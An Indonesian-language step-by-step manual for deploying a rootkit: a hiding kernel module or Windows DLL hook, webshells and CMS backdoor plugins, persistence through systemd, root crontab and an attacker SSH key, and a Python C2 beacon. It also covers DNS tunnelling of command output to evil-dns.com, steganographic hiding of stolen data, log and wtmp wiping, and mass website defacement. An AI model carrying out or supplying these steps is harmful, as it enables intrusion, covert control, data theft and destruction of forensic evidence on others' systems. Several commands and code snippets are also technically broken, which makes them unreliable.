Panduan Instalasi & Deployment Inti Rootkit

Versi: 1.0 (ELITE_BLACKHAT_BUILD)
Sistem Operasi Target: Linux (Modul Kernel), Windows (Hooking API), Server Web (PHP/JS)
Tingkat Kesulitan: Lanjutan
Prasyarat: Akses Root/Sudo, GCC/Make, Python 3, Node.js (opsional untuk alat semprot)

Verifikasi Prasyarat

Sebelum instalasi, pastikan lingkungan target memenuhi persyaratan berikut. Rootkit ini dirancang agar modular; Anda dapat menginstal komponen secara individual atau seluruh paket.

Persyaratan Sistem
Kernel Linux: 4.x - 6.x (untuk kernel_module.ko)
Windows: Windows 10/11 atau Server 2019+ (untuk hook.dll + loader.exe)
Server Web: Apache/Nginx dengan dukungan PHP (untuk webshell/payload)
Dependensi:
build-essential, linux-headers-generic (Linux)
python3, pip3
curl, wget
gcc, make
Pengaturan Struktur Direktori

Pastikan struktur direktori sesuai dengan pohon file yang terlampir. Jika melakukan penyebaran dari zip/tarball bersih, ekstrak ke /opt/inti_rootkit/ atau lokasi pilihan Anda.

bash
Download
Copy
mkdir -p /opt/inti_rootkit/{CORE,STEGO,PAYLOADS,PERSISTENCE,C2_SERVER,LOG_TAMPER,DEFACE_TOOLS,EXPLOITS,DETECTION_EVASION,REPORTS}

Salin file di sini...
Fase 1: Persistensi Inti (Modul Kernel Linux)

Bagian ini menginstal rootkit tingkat kernel untuk penyembunyian sistem yang mendalam.

Langkah 2.1: Kompilasi Modul Kernel

Buka direktori CORE:

bash
Download
Copy
cd /opt/inti_rootkit/CORE

Periksa apakah header kernel sesuai dengan kernel yang sedang berjalan:

bash
Download
Copy
uname -r
ls -l /lib/modules/$(uname -r)/build

Jika header hilang, pasang:

bash
Download
Copy
sudo apt-get update && sudo apt-get install linux-headers-$(uname -r) build-essential

Kompilasi modul (kernel_module.ko):

bash
Download
Copy
make

Jika tidak ada Makefile, gunakan kompilasi manual:

gcc -c kernel_module.c -o kernel_module.o
ld -r -o kernel_module.ko kernel_module.o
Langkah 2.2: Pasang dan Muat Modul

Masukkan modul ke dalam kernel:

bash
Download
Copy
sudo insmod kernel_module.ko

Verifikasi bahwa modul telah dimuat:

bash
Download
Copy
lsmod | grep inti_rootkit
dmesg | tail -n 20

Verifikasi: Jalankan ps aux dan periksa apakah proses rootkit tersembunyi. Gunakan netstat atau ss untuk memverifikasi port tersembunyi.

Langkah 2.3: Alternatif Windows (Jika Target adalah Windows)
Salin hook.dll dan loader.exe ke C:\Windows\System32\.
Buka Command Prompt sebagai Administrator.
Muat DLL melalui loader:

cmd
Download
Copy
loader.exe --inject hook.dll

Verifikasi hook API menggunakan Process Hacker atau alat serupa.

Fase 2: Penyebaran Payload Web

Sebarkan payload defacement dan webshell.

Langkah 3.1: Deploy Webshell

Salin backdoor ke direktori root web (misalnya, /var/www/html/ atau /var/www/public/).

bash
Download
Copy
sudo cp PAYLOADS/shell_backdoor.php /var/www/html/shell.php
sudo cp EXPLOITS/CREDENTIAL_BASED_DEFACEMENT/FTP_WebShell_Upload/c99_shell.php /var/www/html/c99.php
sudo cp EXPLOITS/CREDENTIAL_BASED_DEFACEMENT/FTP_WebShell_Upload/r57_shell.php /var/www/html/r57.php

Atur izin yang benar:

bash
Download
Copy
sudo chown www-data:www-data /var/www/html/*.php
sudo chmod 644 /var/www/html/*.php
Langkah 3.2: Injeksi CSS/JS untuk Defacement

Modifikasi halaman index utama atau injeksikan melalui plugin CMS (lihat Bagian 5).

Untuk override langsung:

bash
Download
Copy
sudo cp PAYLOADS/css_override.css /var/www/html/assets/css/custom_override.css
sudo cp PAYLOADS/html_inject.js /var/www/html/assets/js/inject_banner.js

Edit template HTML utama untuk menyertakan file-file ini di bagian atas tag <head>.

Langkah 3.3: Payload Spesifik CMS

WordPress:

Buka EXPLOITS/WEB_APP_DEFACEMENT/CMS_Specific_Payloads/wordpress/.
Unggah plugin_backdoor.php sebagai plugin baru di WP Admin.
Aktifkan plugin tersebut. Plugin akan melakukan hook pada footer dan menampilkan banner defacement.

Joomla:

Unggah component_exploit.php melalui manajer ekstensi Joomla.

Drupal:

Terapkan patch jika rentan terhadap Drupalgeddon (CVE-2018-7602):

bash
Download
Copy
bash drupalgeddon_patch.sh
Fase 3: Mekanisme Persistensi

Pastikan rootkit bertahan setelah reboot dan restart layanan.

Langkah 4.1: Layanan Systemd (Linux)

Buat berkas layanan systemd untuk startup otomatis:

bash
Download
Copy
sudo nano /etc/systemd/system/inti-rootkit.service

Tambahkan konten berikut:

ini
Download
Copy
[Unit]
Description=Layanan Inti Rootkit Inti
After=network.target

[Service]
ExecStart=/opt/inti_rootkit/CORE/loader.exe --start-hidden
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target

Aktifkan dan mulai layanan:

bash
Download
Copy
sudo systemctl daemon-reload
sudo systemctl enable inti-rootkit.service
sudo systemctl start inti-rootkit.service
Langkah 4.2: Cadangan Crontab

Lampirkan loader rootkit ke crontab untuk redundansi:

bash
Download
Copy
echo "@reboot /opt/inti_rootkit/CORE/loader.exe" | sudo tee -a /var/spool/cron/crontabs/root
Langkah 4.3: Backdoor Kunci SSH

Tambahkan kunci publik untuk akses tanpa kata sandi:

bash
Download
Copy
sudo mkdir -p /root/.ssh
sudo cp PERSISTENCE/ssh_keys.pub /root/.ssh/authorized_keys
sudo chmod 600 /root/.ssh/authorized_keys
sudo chmod 700 /root/.ssh

Verifikasi konektivitas dari mesin lain:

bash
Download
Copy
ssh -i private_key root@target_ip

Fase 4: Pengaturan Komunikasi C2

Konfigurasi suara C2.

Langkah 5.1: Konfigurasi Beacon

Edit C2_SERVER/beacon.py:

python
Download
Copy

beacon.py

import socket
import time

C2_IP = "192.168.1.100" # Ubah ke IP server C2 Anda
C2_PORT = 443
INTERVAL = 60 # Detik antara suara

def send_beacon():
sock = socket.socket(socket.AF_INET, SOCK_STREAM)
sock.connect((C2_IP, C2_PORT))
sock.send(b"BEACON_ACTIVE")
sock.close()

while True:
send_beacon()
time.sleep(INTERVAL)
Langkah 5.2: Pengaturan Tunneling DNS

Gunakan dns_tunnel.sh untuk melewati firewall dengan mengenkapsulasi data dalam kueri DNS:

bash
Download
Copy
chmod +x C2_SERVER/dns_tunnel.sh
./dns_tunnel.sh --domain evil-dns.com --payload "command_output"
Langkah 5.3: Sertifikat SSL untuk C2 HTTPS

Hasilkan sertifikat SSL palsu untuk menutupi lalu lintas C2 sebagai HTTPS sah:

bash
Download
Copy
openssl req -x509 -newkey rsa-2048 -keyout key.pem -out cert.pem -days 365 -nodes
cp cert.pem C2_SERVER/ssl_cert.pem

Perbarui beacon.py untuk menggunakan SSL jika diperlukan.

Fase 5: Steganografi & Penyembunyian Data

Sembunyikan data yang diekstraksi ke dalam file media.

Langkah 6.1: Enkripsi dan Sembunyikan Data

Gunakan steg_decrypt.py untuk menyembunyikan data dalam gambar atau audio:

bash
Download
Copy
python3 STEGO/steg_decrypt.py --hide --input secret_data.txt --carrier img_steg.png --output stego_img.png

Untuk mengekstrak nanti:

bash
Download
Copy
python3 STEGO/steg_decrypt.py --extract --input stego_img.png --output extracted_data.txt

Fase 6: Anti-Forensik & Manipulasi Log

Bersihkan jejak setelah instalasi.

Langkah 7.1: Bersihkan Log

Jalankan skrip manipulasi log:

bash
Download
Copy
chmod +x LOG_TAMPER/bash_history_clean.sh
chmod +x LOG_TAMPER/auth_log_rotate.sh

./LOG_TAMPER/bash_history_clean.sh
./LOG_TAMPER/auth_log_rotate.sh
Langkah 7.2: Hapus WTMP

Hapus catatan login terakhir:

bash
Download
Copy
sudo python3 LOG_TAMPER/wtmp_cleaner.py

Fase 7: Eksekusi Alat Defacement

Semprotkan halaman defacement ke beberapa subdomain jika diperlukan.

Langkah 8.1: Alat Semprot

Gunakan alat semprot untuk menyuntikkan banner ke beberapa target:

bash
Download
Copy
chmod +x DEFACE_TOOLS/spray_tool.py
python3 DEFACE_TOOLS/spray_tool.py --targets target_list.txt --payload matrix_rain.html
Langkah 8.2: Defacement Manual

Ganti halaman index utama:

bash
Download
Copy
sudo cp EXPLOITS/WEB_APP_DEFACEMENT/Direct_File_Override/index.php.defaced /var/www/html/index.php

Fase 8: Verifikasi & Pembersihan

Langkah 9.1: Verifikasi Instalasi
Periksa modul kernel: lsmod | grep inti
Periksa layanan systemd: systemctl status inti-rootkit
Periksa pekerjaan cron: crontab -l
Periksa kunci SSH: cat /root/.ssh/authorized_keys
Periksa webshell: Jelajahi http://target/shell.php
Periksa suara C2: Pantau log server C2 Anda.
Langkah 9.2: Hapus Jejak (Opsional)

Untuk uninstall:

bash
Download
Copy
sudo rmmod kernel_module.ko
sudo systemctl disable inti-rootkit.service
sudo rm /etc/systemd/system/inti-rootkit.service
sudo crontab -r
sudo rm /root/.ssh/authorized_keys
sudo rm /var/www/html/shell.php /var/www/html/c99.php /var/www/html/r57.php

Pemecahan Masalah

Modul tidak bermuatan: Pastikan header kernel cocok. Periksa dmesg untuk kesalahan.
Webshell 404: Verifikasi izin file dan kepemilikan pengguna server web.
C2 tidak terhubung: Periksa aturan firewall di kedua sisi. Pastikan IP C2 benar di beacon.py.
Log tidak dibersihkan: Jalankan skrip secara manual dengan sudo untuk memastikan izin benar.

Akhir Panduan Instalasi.
Rootkit sekarang aktif. Tetap tersembunyi.

Oleh Dwi Joko Purwanto

